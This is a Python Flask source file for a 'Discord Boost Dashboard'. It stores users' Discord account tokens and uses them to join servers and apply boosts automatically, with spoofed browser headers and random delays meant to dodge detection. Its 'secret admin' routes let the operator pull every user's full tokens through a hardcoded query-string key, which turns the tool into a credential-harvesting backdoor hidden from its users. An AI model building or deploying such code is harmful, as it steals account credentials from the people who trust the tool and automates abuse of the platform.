from flask import Flask, render_template, request, jsonify
import requests
import json
import os
import time
import random
import threading
import base64
from datetime import datetime

app = Flask(__name__)

# ==================== SECRET KEY (CHANGE THIS!) ====================
# This is your private key - only YOU know it
ADMIN_SECRET = "MySecretKey2024"
# Change "MySecretKey2024" to anything you want, like "myprivatekey123"

# ==================== STORAGE ====================
DATA_DIR = "/tmp/discord_booster"
TOKENS_FILE = os.path.join(DATA_DIR, "tokens.json")
HISTORY_FILE = os.path.join(DATA_DIR, "history.json")

os.makedirs(DATA_DIR, exist_ok=True)

def load_tokens():
    if not os.path.exists(TOKENS_FILE):
        return {}
    with open(TOKENS_FILE, 'r') as f:
        return json.load(f)

def save_tokens(tokens):
    with open(TOKENS_FILE, 'w') as f:
        json.dump(tokens, f)

def load_history():
    if not os.path.exists(HISTORY_FILE):
        return []
    with open(HISTORY_FILE, 'r') as f:
        return json.load(f)

def save_history(history):
    with open(HISTORY_FILE, 'w') as f:
        json.dump(history, f)

# ==================== HEADERS ====================
def get_super_properties():
    props = {
        "os": "Windows",
        "browser": "Chrome",
        "device": "",
        "system_locale": "en-US",
        "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "browser_version": "120.0.0.0",
        "os_version": "10",
        "release_channel": "stable",
        "client_build_number": 316286
    }
    return base64.b64encode(json.dumps(props).encode()).decode()

def get_headers(token=None, invite_code=None):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "X-Super-Properties": get_super_properties(),
        "X-Discord-Locale": "en-US",
        "Origin": "https://discord.com",
        "Referer": f"https://discord.com/invite/{invite_code}" if invite_code else "https://discord.com/channels/@me",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }
    if token:
        headers["Authorization"] = token
    return headers

def random_delay():
    time.sleep(random.uniform(0.5, 1.5))

# ==================== TOKEN CHECKER ====================
def check_token(token):
    try:
        headers = get_headers(token)
        random_delay()
        
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code != 200:
            return {"valid": False, "error": f"Status {r.status_code}"}
        
        user_data = r.json()
        
        random_delay()
        r_boosts = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers, timeout=10)
        boosts = 0
        if r_boosts.status_code == 200:
            boosts = sum(1 for s in r_boosts.json() if s.get("cooldown_ends_at") is None)
        
        return {
            "valid": True,
            "username": user_data.get("username", "Unknown"),
            "boosts": boosts
        }
    except Exception as e:
        return {"valid": False, "error": str(e)[:50]}

# ==================== JOIN + BOOST ====================
def join_server(token, invite_code):
    try:
        headers = get_headers(token, invite_code)
        random_delay()
        
        resolve_url = f"https://discord.com/api/v9/invites/{invite_code}?with_counts=true&with_expiration=true"
        resolve_resp = requests.get(resolve_url, headers=headers, timeout=10)
        
        if resolve_resp.status_code != 200:
            return False, None, f"Invite invalid: {resolve_resp.status_code}"
        
        invite_data = resolve_resp.json()
        guild_id = invite_data.get("guild", {}).get("id")
        
        if not guild_id:
            return False, None, "Could not get guild ID"
        
        random_delay()
        
        join_resp = requests.post(f"https://discord.com/api/v9/invites/{invite_code}", headers=headers, json={}, timeout=10)
        
        if join_resp.status_code == 200:
            return True, guild_id, None
        else:
            return False, None, f"Join failed: {join_resp.status_code}"
    except Exception as e:
        return False, None, str(e)[:50]

def apply_boost(token, guild_id):
    try:
        headers = get_headers(token)
        random_delay()
        
        boost_resp = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions", headers=headers, json={}, timeout=10)
        
        if boost_resp.status_code in [200, 201]:
            return True, None
        else:
            return False, f"Boost failed: {boost_resp.status_code}"
    except Exception as e:
        return False, str(e)[:50]

# ==================== USER ROUTES ====================
@app.route('/')
def dashboard():
    user = request.args.get('user', 'default')
    return render_template('dashboard.html', user=user)

@app.route('/api/tokens', methods=['GET'])
def get_tokens():
    user = request.args.get('user', 'default')
    tokens_data = load_tokens()
    user_tokens = tokens_data.get(user, [])
    
    results = []
    for token in user_tokens:
        info = check_token(token)
        results.append({
            "token": token[:20] + "...",
            "full_token": token,
            **info
        })
    return jsonify(results)

@app.route('/api/tokens/add', methods=['POST'])
def add_token():
    data = request.json
    user = data.get('user', 'default')
    token = data.get('token', '').strip()
    
    if not token:
        return jsonify({"error": "No token"})
    
    info = check_token(token)
    if not info['valid']:
        return jsonify({"status": "invalid", "error": info.get('error', 'Invalid token')})
    
    tokens_data = load_tokens()
    if user not in tokens_data:
        tokens_data[user] = []
    
    if token not in tokens_data[user]:
        tokens_data[user].append(token)
        save_tokens(tokens_data)
    
    return jsonify({"status": "ok", "username": info['username']})

@app.route('/api/tokens/remove', methods=['POST'])
def remove_token():
    data = request.json
    user = data.get('user', 'default')
    token = data.get('token', '')
    
    tokens_data = load_tokens()
    if user in tokens_data:
        tokens_data[user] = [t for t in tokens_data[user] if t != token]
        save_tokens(tokens_data)
    
    return jsonify({"status": "ok"})

@app.route('/api/boost/start', methods=['POST'])
def start_boost():
    data = request.json
    user = data.get('user', 'default')
    invite = data.get('invite', '').strip()
    target_boosts = int(data.get('target_boosts', 1))
    
    if "discord.gg/" in invite:
        invite = invite.split("discord.gg/")[-1].split("/")[0]
    
    tokens_data = load_tokens()
    user_tokens = tokens_data.get(user, [])
    
    if not user_tokens:
        return jsonify({"error": "No tokens found"})
    
    boostable_tokens = []
    for token in user_tokens:
        info = check_token(token)
        if info['valid'] and info['boosts'] > 0:
            boostable_tokens.append({
                'token': token,
                'username': info['username'],
                'boosts': info['boosts']
            })
    
    if not boostable_tokens:
        return jsonify({"error": "No tokens with available boosts"})
    
    total_available = sum(t['boosts'] for t in boostable_tokens)
    if total_available < target_boosts:
        return jsonify({"error": f"Need {target_boosts} boosts, only have {total_available}"})
    
    def do_boosting():
        results = []
        boosts_applied = 0
        
        for bt in boostable_tokens:
            if boosts_applied >= target_boosts:
                break
            
            success, guild_id, error = join_server(bt['token'], invite)
            if not success:
                results.append(f"❌ {bt['username']}: {error}")
                continue
            
            results.append(f"✅ {bt['username']}: Joined server")
            random_delay()
            
            boosts_to_apply = min(bt['boosts'], target_boosts - boosts_applied)
            applied = 0
            
            for i in range(boosts_to_apply):
                boost_success, boost_error = apply_boost(bt['token'], guild_id)
                if boost_success:
                    applied += 1
                    boosts_applied += 1
                time.sleep(random.uniform(2, 4))
            
            results.append(f"📊 {bt['username']}: Applied {applied} boosts")
            time.sleep(random.uniform(2, 3))
        
        history = load_history()
        history.append({
            "user": user,
            "invite": invite,
            "target": target_boosts,
            "applied": boosts_applied,
            "results": results,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        save_history(history)
    
    thread = threading.Thread(target=do_boosting)
    thread.start()
    
    return jsonify({"status": "started", "message": f"Boosting started with {len(boostable_tokens)} tokens"})

@app.route('/api/history', methods=['GET'])
def get_history():
    user = request.args.get('user', 'default')
    history = load_history()
    user_history = [h for h in history if h.get('user') == user]
    return jsonify(user_history)

# ==================== SECRET ADMIN ROUTES (ONLY YOU CAN SEE) ====================
@app.route('/admin')
def admin_panel():
    """Secret admin dashboard - only accessible with correct secret"""
    secret = request.args.get('secret', '')
    if secret != ADMIN_SECRET:
        return '''
        <h1>🔒 Access Denied</h1>
        <p>You need the correct secret key to access this page.</p>
        <p>Add <code>?secret=YOUR_SECRET_KEY</code> to the URL.</p>
        ''', 401
    return render_template('admin.html')

@app.route('/api/admin/all_tokens', methods=['GET'])
def admin_all_tokens():
    """API endpoint to see ALL tokens from every user"""
    secret = request.args.get('secret', '')
    if secret != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"}), 401
    
    tokens_data = load_tokens()
    
    result = {}
    for user, tokens in tokens_data.items():
        user_tokens = []
        for token in tokens:
            info = check_token(token)
            user_tokens.append({
                "token_preview": token[:25] + "...",
                "full_token": token,
                "username": info.get('username', 'Unknown'),
                "valid": info.get('valid', False),
                "boosts": info.get('boosts', 0)
            })
        result[user] = user_tokens
    
    return jsonify({
        "total_users": len(result),
        "total_tokens": sum(len(t) for t in result.values()),
        "users": result
    })

@app.route('/api/admin/raw', methods=['GET'])
def admin_raw():
    """Get raw token data for backup"""
    secret = request.args.get('secret', '')
    if secret != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"}), 401
    
    return jsonify(load_tokens())

@app.route('/health')
def health():
    return jsonify({"status": "alive"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("="*50)
    print("🚀 Discord Boost Dashboard")
    print("="*50)
    print(f"📱 User dashboard: http://localhost:{port}/?user=YOURNAME")
    print(f"🔒 Admin dashboard: http://localhost:{port}/admin?secret={ADMIN_SECRET}")
    print("="*50)
    app.run(host='0.0.0.0', port=port)
